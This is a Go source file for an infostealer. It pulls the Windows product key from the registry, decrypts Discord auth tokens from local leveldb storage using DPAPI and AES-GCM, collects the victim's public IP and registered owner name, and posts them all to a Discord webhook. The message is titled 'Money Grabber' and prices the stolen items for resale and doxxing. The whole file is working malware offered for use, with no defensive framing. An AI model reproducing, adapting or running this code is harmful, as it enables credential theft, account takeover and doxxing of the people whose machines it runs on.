package getgoodys

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"unsafe"

	"github.com/tidwall/gjson"
	"golang.org/x/sys/windows/registry"
)

func Getkey() string {
	key, _ := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform`, registry.QUERY_VALUE)
	defer key.Close()

	// Read the value
	productKey, _, _ := key.GetStringValue("BackupProductKeyDefault")

	return productKey
}

var (
	procUnprotectData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree     = dllkernel32.NewProc("LocalFree")

	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")

	roaming string = os.Getenv("APPDATA")
	local   string = os.Getenv("LOCALAPPDATA")

	discords = []string{
		roaming + "\\discord\\",
		roaming + "\\discordptb\\",
		roaming + "\\discordcanary\\",
	}
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}
func Decrypt(data []byte) []byte {
	var output DATA_BLOB

	ptr, _, _ := procUnprotectData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&output)))
	if ptr == 0 {
		return nil
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(output.pbData)))
	return output.ToByteArray()
}

func DecryptData(data, key []byte) string {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered from panic:", r)
		}
	}()

	iv := data[3:15]
	ciphertext := data[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err == nil {
		return string(plaintext[:len(plaintext)-16])
	}
	return "Nothing"
}

func Discord_stage() string {

	for _, dir := range discords {

		storage, _ := os.ReadDir(dir + "Local Storage/leveldb/")
		state, _ := os.ReadFile(dir + "Local State")

		for _, file := range storage {

			EncryptRegex := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*`)
			bytes, _ := os.ReadFile(dir + "Local Storage/leveldb/" + file.Name())

			for _, crypted_token := range EncryptRegex.FindAll(bytes, 10) {

				crypted_key := gjson.Get(string(state), "os_crypt.encrypted_key")
				raw_key, _ := base64.StdEncoding.DecodeString(crypted_key.Str)
				master_key := Decrypt(raw_key[5:])

				raw_token, _ := base64.StdEncoding.DecodeString(string(crypted_token)[12:])
				clean_token := raw_token[3:]

				aes_cipher, _ := aes.NewCipher(master_key)
				gcm_cipher, _ := cipher.NewGCM(aes_cipher)
				nonceSize := gcm_cipher.NonceSize()
				nonce, enc_token := clean_token[:nonceSize], clean_token[nonceSize:]
				token, _ := gcm_cipher.Open(nil, nonce, enc_token, nil)

				return string(token)

			}
		}
	}
	return ""
}

func Get_ip() string {
	resp, get_request_error := http.Get("http://api.ipify.org/")
	if get_request_error != nil {
		fmt.Printf("[-] Error, %s\n", get_request_error)
	}
	defer resp.Body.Close()
	decoding_resp, _ := io.ReadAll(resp.Body)
	ip := string(decoding_resp)
	return ip
}

func Get_email() string {
	getsysinfo := exec.Command("powershell", "-Command", `(Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion").RegisteredOwner`)

	output_sysinfo, err := getsysinfo.Output()
	if err != nil {
		fmt.Printf("[-] Error, %s\n", err)
	}
	return string(output_sysinfo)
}

// runs all the functions to get info and sends it to webhook
func Send_webhook(webhook string) {
	info := "# :money_with_wings: Money Grabber :money_with_wings: " + "\n**Windows key** `" + Getkey() + "` - Can sell for *$0.99 - $9.99* :money_mouth: " + "\n**Token** ` " + Discord_stage() + " ` - Can sell for *$0.99 - $20.00* :money_mouth:" + "\n**IP** `" + Get_ip() + "` - Used for doxxing/hacking :wolf: " + "\n**Email** ` " + Get_email() + "` - Used for doxxing/hacking :brain: \n ||@everyone||"
	
	message := map[string]string{"content": info}
	messageBytes, _ := json.Marshal(message)
	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(messageBytes))
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

}
